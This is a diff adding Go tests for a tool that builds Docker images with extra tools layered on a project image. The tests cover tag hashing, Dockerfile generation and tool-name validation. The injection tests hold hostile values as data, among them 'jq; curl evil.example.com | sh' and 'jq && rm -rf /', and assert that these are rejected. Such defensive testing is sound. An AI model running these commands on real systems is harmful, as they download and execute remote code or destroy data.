@@ -221,3 +221,72 @@ func TestImageNameSurvivesAwkwardDirectoryNames(t *testing.T) {
 		t.Errorf("image = %q", p.Image)
 	}
 }
+
+func TestToolsImageTracksContents(t *testing.T) {
+	dir := projectDir(t, map[string]string{"go.mod": "module x\n"})
+	p, err := Resolve(dir, config.Defaults(), loadSet(t, goPlugin))
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	// No tools means no derived image at all.
+	if p.ToolsImage(nil) != p.Image {
+		t.Errorf("empty list produced a derived tag: %q", p.ToolsImage(nil))
+	}
+
+	one := p.ToolsImage([]string{"jq"})
+	two := p.ToolsImage([]string{"jq", "ripgrep"})
+	if one == two {
+		t.Fatal("different tool sets share a tag; the tag would lie about its contents")
+	}
+	// Order is not content: the same set must reuse the built image.
+	if got := p.ToolsImage([]string{"ripgrep", "jq"}); got != two {
+		t.Errorf("tag depends on order: %q vs %q", got, two)
+	}
+}
+
+func TestToolsDockerfileLayersOnTheProjectImage(t *testing.T) {
+	df := ToolsDockerfile("dev-img-app", []string{"jq"})
+	if !strings.HasPrefix(df, "FROM dev-img-app\n") {
+		t.Errorf("tools must layer onto the project image:\n%s", df)
+	}
+	// A declaration rebuilt into an image, never a committed container.
+	if strings.Contains(df, "commit") {
+		t.Errorf("unexpected commit:\n%s", df)
+	}
+	for _, mgr := range []string{"apt-get", "apk", "dnf"} {
+		if !strings.Contains(df, mgr) {
+			t.Errorf("no %s branch; the image family is not known in advance:\n%s", mgr, df)
+		}
+	}
+}
+
+func TestToolNamesAreValidatedAgainstInjection(t *testing.T) {
+	// The list is interpolated into a RUN line, so a name carrying shell
+	// metacharacters would execute during the build.
+	for _, bad := range []string{
+		"jq; curl evil.example.com | sh",
+		"jq && rm -rf /",
+		"$(whoami)",
+		"`id`",
+		"jq|tee",
+		"",
+		"a b",
+	} {
+		if ValidToolName(bad) {
+			t.Errorf("accepted dangerous tool name %q", bad)
+		}
+	}
+	for _, ok := range []string{"jq", "ripgrep", "python3.12", "lib-foo_bar", "g++"} {
+		if !ValidToolName(ok) {
+			t.Errorf("rejected a legitimate name %q", ok)
+		}
+	}
+}
+
+func TestDangerousToolNameNeverReachesTheDockerfile(t *testing.T) {
+	df := ToolsDockerfile("base", []string{"jq; curl evil.example.com | sh"})
+	if strings.Contains(df, "evil.example.com") {
+		t.Fatalf("injection reached the build:\n%s", df)
+	}
+}
